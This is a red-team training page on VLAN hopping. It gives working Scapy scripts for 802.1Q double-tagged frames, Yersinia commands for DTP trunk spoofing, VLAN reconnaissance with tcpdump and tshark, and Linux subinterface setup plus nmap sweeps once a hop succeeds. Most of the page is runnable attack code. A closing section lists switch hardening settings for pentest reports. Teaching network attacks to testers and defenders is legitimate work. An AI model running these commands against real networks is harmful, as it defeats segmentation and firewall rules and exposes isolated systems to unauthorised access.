---
layout: training-page
title: "VLAN Hopping — Red Team Academy"
module: "Network Attacks"
tags:
  - vlan
  - 802.1q
  - dtp
  - network
  - layer2
page_key: "network-vlan-hopping"
render_with_liquid: false
---

# VLAN Hopping

VLAN hopping allows an attacker on one VLAN to send traffic to another VLAN that should be logically isolated, bypassing firewall rules and network segmentation. Two primary techniques: double tagging exploits how switches handle 802.1Q frames, and DTP spoofing tricks a switch into forming a trunk link that carries all VLANs.

## 802.1Q Primer

```
Access port  — carries traffic for a single VLAN; strips/adds tag
Trunk port   — carries tagged traffic for multiple VLANs
Native VLAN  — frames sent untagged on a trunk; default is VLAN 1

Double-tag attack exploits the native VLAN:
  Attacker is on VLAN 10 (native VLAN of the uplink trunk)
  Attacker sends frame with two 802.1Q tags: outer=VLAN10, inner=VLAN20
  First switch strips outer tag (native VLAN — untagged forwarding)
  Second switch sees inner tag (VLAN20) → forwards into VLAN20
  Traffic reaches VLAN20 from VLAN10
  NOTE: this is one-way only — replies don't return via this path
```

## Attack 1: 802.1Q Double Tagging

```bash
# Requirements:
# - Attacker is on the native VLAN of the trunk uplink
# - Target is on a different VLAN reachable through that trunk

# Craft double-tagged frame with Scapy
python3 << 'EOF'
from scapy.all import *

# Double-tagged packet: outer VLAN 10 (native), inner VLAN 20 (target)
packet = (
    Ether(dst="FF:FF:FF:FF:FF:FF") /
    Dot1Q(vlan=10) /          # outer tag — native VLAN, stripped by first switch
    Dot1Q(vlan=20) /          # inner tag — delivered to VLAN 20
    IP(dst="192.168.20.1") /
    ICMP()
)
sendp(packet, iface="eth0")
EOF

# With Yersinia
yersinia -I  # interactive mode
# Select 802.1Q → Launch attack → Send 802.1Q double encapsulated

# Check if you're on the native VLAN first:
# If your switch port is an access port on VLAN 1 and VLAN 1 is the native VLAN
# on trunk links → you're vulnerable to double-tag attacks toward other VLANs
```

## Attack 2: DTP Trunk Negotiation (Switch Spoofing)

```bash
# DTP (Dynamic Trunking Protocol) — Cisco proprietary
# If a switch port is in "dynamic auto" or "dynamic desirable" mode,
# it will negotiate a trunk with any device that requests one
# An attacker can impersonate a switch and negotiate a trunk port
# gaining access to ALL VLANs

# Yersinia — DTP attack
yersinia -I
# Select DTP → "Enabling trunk mode" attack

# Or using yersinia in CLI mode
yersinia dtp -attack 1 -interface eth0

# After trunk is established, configure a VLAN interface on attacker
modprobe 8021q
ip link add link eth0 name eth0.20 type vlan id 20
ip addr add 192.168.20.100/24 dev eth0.20
ip link set eth0.20 up

# Now you have direct access to VLAN 20
```

## Attack 3: VLAN Stacking with Scapy (Targeted Delivery)

```bash
# Craft custom packets for specific targets across VLANs
python3 << 'EOF'
from scapy.all import *

target_mac = "AA:BB:CC:DD:EE:FF"  # target MAC in VLAN 20

p = (Ether(dst=target_mac) /
     Dot1Q(vlan=10) /
     Dot1Q(vlan=20) /
     IP(src="192.168.10.50", dst="192.168.20.5") /
     TCP(dport=445) /
     Raw(load=b"\x00" * 20))

sendp(p, iface="eth0", count=5)
EOF
```

## Reconnaissance — Identify VLANs

```bash
# Sniff 802.1Q tagged frames to discover VLANs in use
tcpdump -i eth0 -e 'vlan'
# Look for: "vlan X" in output — reveals active VLAN IDs

# With tshark
tshark -i eth0 -Y "vlan" -T fields -e eth.src -e vlan.id

# CDP/LLDP — discover switch port and VLAN info
# Cisco Discovery Protocol frames reveal switch model, port, VLAN
tcpdump -i eth0 'ether proto 0x2000'  # CDP
tcpdump -i eth0 'ether proto 0x88cc'  # LLDP

# Parse CDP with Wireshark:
# Filter: cdp → reveals native VLAN, device capabilities, interface

# VTP (VLAN Trunking Protocol) — reveals all VLANs in domain
# tcpdump: ether dst 01:00:0c:cc:cc:cc
# Wireshark filter: vtp
```

## VLAN Interface Setup After Successful Hop

```bash
# Configure attacker to communicate on target VLAN

# Method 1: Linux 802.1Q subinterface
modprobe 8021q
ip link add link eth0 name eth0.vlan20 type vlan id 20
ip link set eth0.vlan20 up
dhclient eth0.vlan20  # get DHCP address from target VLAN

# Method 2: Manual IP
ip addr add 192.168.20.50/24 dev eth0.vlan20
ip route add 192.168.20.0/24 dev eth0.vlan20

# Verify connectivity to target VLAN
ping 192.168.20.1
nmap -sn 192.168.20.0/24
```

## Mitigations (for Report Findings)

```
Vulnerable configurations:
  - Native VLAN = VLAN 1 (default) on trunk links
  - DTP enabled on access ports ("dynamic auto" or "dynamic desirable")
  - No private VLANs (PVLANs) for isolation within a VLAN

Secure configurations:
  - Set native VLAN to an unused VLAN (not VLAN 1) on trunk links
  - Disable DTP: "switchport nonegotiate" on all access ports
  - Set access ports explicitly: "switchport mode access"
  - Prune VLANs from trunks to only what's needed
  - Enable Dynamic ARP Inspection (DAI) and DHCP snooping
```

## Resources

- Yersinia — `github.com/tomac/yersinia`
- MITRE T1599 — Network Boundary Bridging — `attack.mitre.org/techniques/T1599/`
- Scapy documentation — `scapy.net`
- Cisco 802.1Q VLAN security guide — `cisco.com`
